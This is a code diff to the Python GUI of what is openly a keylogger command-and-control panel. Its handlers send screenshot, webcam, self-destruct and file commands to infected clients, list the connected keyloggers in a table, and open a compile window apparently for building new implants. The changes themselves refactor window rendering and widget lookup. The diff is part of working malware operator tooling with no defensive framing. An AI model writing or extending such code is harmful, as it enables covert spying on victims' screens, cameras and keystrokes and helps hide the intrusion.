@@ -1,10 +1,11 @@
 import logging
 
 from .base import BaseEventHandler
+from settings import app_config
 from server import Server
 from gui import UIManager
 from commands import ScreenshotCommand, WebcamCommand, SelfDestructCommand, FileCommand
-from utils import EventHandlerRegister, AsyncTkinter, WidgetRegistry
+from utils import EventHandlerRegister, AsyncTkinter
 
 
 logger = logging.getLogger(__name__)
@@ -15,6 +16,7 @@ class ButtonHeaderHandler:
     @EventHandlerRegister.registry('main')
     @AsyncTkinter.async_handler
     async def command_main():
+        UIManager.render_window(app_config.gui.FILENAME_MAIN_CONFIG)
         print('Main')
 
     @staticmethod
@@ -27,8 +29,8 @@ class ButtonHeaderHandler:
     @EventHandlerRegister.registry('create')
     @AsyncTkinter.async_handler
     async def command_create():
-        UIManager.render_compile_top_level()
-        btn = WidgetRegistry.get('btn_create')
+        UIManager.render_top_level(app_config.gui.FILENAME_COMPILE_CONFIG)
+        btn = UIManager.REGISTER.get('btn_create')
         btn.config(state='disabled')
 
     @staticmethod
@@ -36,6 +38,7 @@ class ButtonHeaderHandler:
     @AsyncTkinter.async_handler
     async def command_screenshot():
         server = Server()
+        UIManager.render_window(app_config.gui.FILENAME_SCREEN_CONFIG)
         logger.info(f'Screenshot command send -> {server.selected_keylogger}')
         response = await server.request(ScreenshotCommand)
         response = response.decode() if response else None
@@ -46,6 +49,7 @@ class ButtonHeaderHandler:
     @AsyncTkinter.async_handler
     async def command_web():
         server = Server()
+        UIManager.render_window(app_config.gui.FILENAME_WEB_CONFIG)
         logger.info(f'Camera command send -> {server.selected_keylogger}')
         response = await server.request(WebcamCommand)
         response = response.decode() if response else None if response else None
@@ -75,10 +79,13 @@ class ButtonHeaderHandler:
 class ButtonMainHandler:
     @staticmethod
     @EventHandlerRegister.registry('refresh_list')
-    def command_refresh():
+    @AsyncTkinter.async_handler
+    async def command_refresh():
         logger.info('Refresh Table')
-        keyloggers = set(Server().clients.keys())
-        table = WidgetRegistry.get('table_keyloggers')
+        server = Server()
+        await server.monitor_client()
+        keyloggers = set(server.clients.keys())
+        table = UIManager.REGISTER.get('table_keyloggers')
         rows = dict(map(lambda item: (tuple(item.values), item.iid), table.get_rows()))
         all_rows = set(rows.keys())
         rows_delete, rows_insert = all_rows - keyloggers, keyloggers - all_rows
